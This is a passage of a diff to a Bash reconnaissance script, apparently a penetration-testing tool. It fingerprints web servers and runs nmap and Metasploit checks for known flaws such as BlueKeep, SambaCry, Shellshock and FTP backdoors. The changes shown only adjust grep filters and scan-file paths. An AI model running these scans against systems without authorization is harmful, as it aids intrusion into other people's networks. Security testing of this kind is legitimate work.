 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes					
 						enumeracionTomcat "http" $ip $port							
@@ -3755,7 +3764,7 @@ then
 							noEscaneado=1
 						fi	
 						
-						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out" .enumeracion/"$subdominio"_"$port"_webData.txt
+						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" .enumeracion/"$subdominio"_"$port"_webData.txt
 						hostOK=$?	
 						
 						egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
@@ -3779,7 +3788,7 @@ then
 						
 														
 							###  if the server is apache ######
-							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes																
 								enumeracionApache "https" $subdominio $port
@@ -3787,7 +3796,7 @@ then
 							####################################	
 
 							#######  if the server is SharePoint ######
-							grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+							grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es SharePoint 																															
 								enumeracionSharePoint "https" $subdominio $port
@@ -3797,7 +3806,7 @@ then
 							####################################
 							
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes															
 								enumeracionIIS "https" $subdominio $port								   
@@ -3821,7 +3830,8 @@ then
 							# if not technology not reconigzed
 							
 							serverType=`cat .enumeracion/"$subdominio"_"$port"_webData.txt | cut -d "~" -f2`
-							echo -e "\t\t[+] serverType $serverType"					
+							echo -e "\t\t[+] serverType $serverType"
+							
 							if [  -z "$serverType" ]; then
 								enumeracionDefecto "https" $subdominio $port
 							fi								
@@ -3868,7 +3878,7 @@ then
 				egrep -iq $md5 webClone/checksumsEscaneados.txt
 				noEscaneado=$?
 				
-				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out" .enumeracion/"$ip"_"$port"_webData.txt
+				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|GoAhead-Webs" .enumeracion/"$ip"_"$port"_webData.txt
 				hostOK=$?	#1= no es redireccion, o genero un error al conectar
 						
 				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado. Enumerar de todas maneras
@@ -3894,7 +3904,7 @@ then
 					enumeracionCMS "https" $ip $port							
 																							
 					#######  if the server is apache ######
-					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
 					greprc=$?				
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes						
 						enumeracionApache "https" $ip $port
@@ -3902,7 +3912,7 @@ then
 					####################################
 
 					#######  if the server is SharePoint ######
-					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint 																															
 						enumeracionSharePoint "https" $ip $port
@@ -3912,7 +3922,7 @@ then
 					####################################
 		
 					#######  if the server is IIS ######
-					grep -qi IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" 
+					grep -qi IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" 
 					greprc=$?
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes											
 						enumeracionIIS "https" $ip $port																
@@ -4200,7 +4210,7 @@ then
 	
 			echo "$proxychains  nmap -Pn -p $port --script rdp-ntlm-info $ip"  > logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
 			$proxychains nmap -n -Pn -p $port --script rdp-ntlm-info $ip >> logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
-			grep --color=never "|" logs/enumeracion/"$ip"_"$port"_rdpInfo.txt   | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_"$port"_rdpInfo.txt
+			grep --color=never "|" logs/enumeracion/"$ip"_"$port"_rdpInfo.txt   | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_"$port"_rdpInfo.txt
 
 
 			echo -e "\t\t[+] Revisando vulnerabilidad blueKeep"			
@@ -4209,7 +4219,7 @@ then
 			
 			echo -e "\t\t[+] Revisando vulnerabilidad MS12-020"
 			$proxychains nmap -n -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
-			grep --color=never "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_3389_ms12020.txt
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_3389_ms12020.txt
 			
 			while true; do
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`
@@ -4259,7 +4269,7 @@ then
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
 		$proxychains nmap -n -Pn -sU -p 69 --script tftp-enum.nse $ip  > logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
 				
 	done		
 	
@@ -4296,7 +4306,7 @@ then
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
 		$proxychains nmap -n -sT -sV -Pn -p $port $ip --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
 		
 		echo -e "\t[+] Obtener banner"	
 		echo -e "\tLIST" | nc -w 3 $ip $port > .banners/"$ip"_"$port".txt 2>/dev/null 
@@ -4358,7 +4368,7 @@ then
 				then
 					echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
 					echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
-					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
+					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
 				else				
 					echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
 				fi
@@ -4471,73 +4481,73 @@ cd .enumeracion2/
 	
 	#phpmyadmin, etc
 	#responde con 401
-	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/web401.txt
+	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/web401.txt
 	
 	#responde con 200 OK
 	cat *_webadmin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
 	
 	#tomcat
-	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google" | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
+	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|whois|google" | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
 	# 
 	
 	#fortinet
-	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/fortinet2.txt
+	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/fortinet2.txt
 	sort ../servicios/fortinet2.txt | uniq > ../servicios/fortinet.txt
 	rm ../servicios/fortinet2.txt
 	
 	#3com
-	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
+	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
 	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
 	rm ../servicios/3com2.txt
 	
 	#d-link
-	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
+	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
 	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
 	rm ../servicios/d-link2.txt
 
 	#linksys
-	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
+	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
 	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
 	rm ../servicios/linksys2.txt
 		
 	
 	#Pentahoo	
 	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
-	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
+	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
 	
 	#Dahua Camera
-	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
+	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
 	
 	#ubiquiti
-	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt	
+	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt	
 	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
 	
 	#pfsense
-	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt
+	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt
 	
 	#PRTG
-	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt
+	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt
 	
 	#ZKsoftware
-	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt		
+	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt		
 
 	#vCenter
-	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt
+	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt
 	
 	
 	#Cisco
-	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/cisco.txt		
+	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/cisco.txt		
 	
 	#ZTE
-	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZTE2.txt
+	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZTE2.txt
 	sort ../servicios/ZTE2.txt | uniq > ../servicios/ZTE.txt ; rm ../servicios/ZTE2.txt
 		
 	
 	#zimbra
-	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt
+	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt
 	
 	#jboss
-	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt
+	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt
 	
 	#401
 		#line = http://200.87.193.109:80/phpmyadmin/	
@@ -4550,7 +4560,7 @@ cd .enumeracion2/
 	
 cd ..
 ################################
-
+# FASE 4
 find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
 
 # UPNP
@@ -4636,7 +4646,7 @@ then
 		echo -e "\t[+]Probando vulnerabilidad de Cisco ASA \n $RESET"
 		echo "$proxychains  nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
 		$proxychains nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt
 		
 #		nmap -n -sT -Pn  -p 443 --script http_vuln-cve2014-2129 $ip > logs/vulnerabilidades/"$ip"_cisco-dos.txt 2>/dev/null		
 		#grep --color=never "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
@@ -4657,7 +4667,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"` 	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -4671,7 +4681,7 @@ then
 			fi				
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -4701,7 +4711,7 @@ then
 		echo -e "[+] Escaneando $ip:445"		
 		echo "$proxychains  nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
 		$proxychains nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_445_sambaVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_445_sambaVuln.txt
 
 		echo -e "\t[+] Obteniendo version de samba"
 		$proxychains msfconsole -x "use auxiliary/scanner/smb/smb_version;set RHOSTS $ip; exploit;exit" >> logs/enumeracion/"$ip"_samba_version.txt 2>/dev/null
@@ -4773,7 +4783,7 @@ then
 		echo -e "[+] Escaneando $ip"		
 		
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -4790,7 +4800,7 @@ then
 			fi
 		fi	
 					
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -4837,7 +4847,7 @@ then
 		echo -e "[+] Escaneando $ip"
 		
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"			
@@ -4870,7 +4880,7 @@ then
 
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -4920,7 +4930,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -4935,7 +4945,7 @@ then
 			
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -4963,7 +4973,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -4976,7 +4986,7 @@ then
 			
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5001,7 +5011,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -5015,7 +5025,7 @@ then
 			fi								
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5092,7 +5102,7 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"` 	
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
@@ -5142,7 +5152,7 @@ then
 	do     						
 		echo -e "[+] Escaneando $ip"	
 		
-		egrep -iq "23/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando Telnet \n $RESET"
@@ -5157,7 +5167,7 @@ then
 			
 		fi		
 
-		egrep -iq "22/open" .escaneo_puertos_1000p/"$ip"_tcp.grep
+		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
 			echo -e "\t Probando SSH \n $RESET"
